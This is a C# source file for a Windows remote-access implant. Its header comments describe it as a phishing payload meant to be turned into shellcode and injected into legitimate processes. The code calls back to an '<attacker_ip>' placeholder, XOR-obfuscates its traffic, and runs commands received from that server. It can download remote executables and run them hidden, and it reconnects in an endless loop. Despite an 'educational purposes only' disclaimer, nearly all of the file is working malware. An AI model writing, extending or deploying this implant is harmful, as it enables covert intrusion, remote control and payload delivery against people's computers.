// This is the main payload for the kind of implant that would be used in a phishing attack.
// This code is a simple implant that connects to a remote server and executes commands received from it.
// It uses XOR encryption to obfuscate the communication between the implant and the server.
// The implant can execute basic commands like "whoami", "hostname", "ipconfig", and "systeminfo" and also download and execute files.
// Instead of using compilied .exe, i use donut to convert it to shellcode and inject it into a legitimate process (e.g: explorer.exe, notepad.exe, etc). 

// THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY.
// DO NOT USE IT FOR MALICIOUS PURPOSES. 

using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Net.NetworkInformation;
using System.Management;

namespace implant
{
    class Program
    {
        // XOR encryption / decryption function
        // Used to encrypt and decrypt traffic between the implant and the server
        static string XOR(string data, string key)
        {
            var output = new StringBuilder();
            for (int i = 0; i < data.Length; i++)
                output.Append((char)(data[i] ^ key[i % key.Length])); // XOR each character with the key
            return output.ToString();
        }

        // Function to execute commands received from the server
        static string ExecuteCommand(string cmd)
        {
            try
            {
                cmd = cmd.Trim(); // Remove any leading/trailing whitespace
                string[] parts = cmd.Split(' '); // Split the command into parts
                string baseCmd = parts[0].ToLower(); // Extract the base command

                // Handle "whoami" command to return the current user
                if (baseCmd == "whoami")
                {
                    return Environment.UserDomainName + "\\" + Environment.UserName;
                }
                // Handle "hostname" command to return the machine name
                else if (baseCmd == "hostname")
                {
                    return Environment.MachineName;
                }
                // Handle "ipconfig" command to return network interface details
                else if (baseCmd == "ipconfig")
                {
                    string output = "";
                    foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                    {
                        var props = ni.GetIPProperties();
                        foreach (var ip in props.UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                                output += $"Interface: {ni.Name} - IP: {ip.Address}\n"; // Append interface and IP details
                        }
                    }
                    return output;
                }
                // Handle "systeminfo" command to return basic system information
                else if (baseCmd == "systeminfo")
                {
                    return $"OS Version: {Environment.OSVersion}\n64-bit OS: {Environment.Is64BitOperatingSystem}\nProcessor Count: {Environment.ProcessorCount}";
                }
                // Handle "download" command to download a file from a URL
                else if (baseCmd == "download" && parts.Length == 2)
                {
                    string url = parts[1];
                    string filename = Path.GetFileName(url);
                    string localPath = Path.Combine(Path.GetTempPath(), filename);
                    new WebClient().DownloadFile(url, localPath); // Download the file to a temporary location
                    return $"Downloaded to {localPath}";
                }
                // Handle "loadexe" command to download and execute an executable file
                else if (baseCmd == "loadexe" && parts.Length == 2)
                {
                    string url = parts[1];
                    string exePath = Path.Combine(Path.GetTempPath(), Path.GetFileName(url));
                    new WebClient().DownloadFile(url, exePath); // Download the executable

                    Process proc = new Process();
                    proc.StartInfo.FileName = exePath;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true; // Execute without showing a window
                    proc.Start();
                    return $"Executed {exePath}";
                }
                // Handle unsupported commands
                else
                {
                    return "Unsupported command or syntax.";
                }
            }
            catch (Exception ex)
            {
                // Return error message if command execution fails
                return $"Error: {ex.Message}";
            }
        }

        // Main function - Entry point of the implant
        static void Main(string[] args)
        {
            string server = "<attacker_ip>"; // Adversary's server IP address
            int port = 31102; // Port to connect to the server
            string key = "secret"; // XOR key for encrypting traffic

            while (true) // Infinite loop to maintain connection
            {
                try
                {
                    // Establish a TCP connection to the server
                    using (TcpClient client = new TcpClient(server, port))
                    using (NetworkStream stream = client.GetStream())
                    {
                        while (true) // Loop to handle commands from the server
                        {
                            byte[] buffer = new byte[4096];
                            int bytesRead = stream.Read(buffer, 0, buffer.Length); // Read data from the server
                            if (bytesRead == 0) break; // Exit if no data is received

                            string encrypted = Encoding.UTF8.GetString(buffer, 0, bytesRead); // Decode received data
                            string command = XOR(encrypted, key); // Decrypt the command

                            if (command == "exit") break; // Exit if the "exit" command is received

                            string result = ExecuteCommand(command); // Execute the command
                            string encryptedResult = XOR(result, key); // Encrypt the result
                            byte[] toSend = Encoding.UTF8.GetBytes(encryptedResult);
                            stream.Write(toSend, 0, toSend.Length); // Send the result back to the server
                        }
                    }
                }
                catch
                {
                    // Wait for 5 seconds before retrying if the connection fails
                    System.Threading.Thread.Sleep(5000);
                }
            }
        }
    }
}
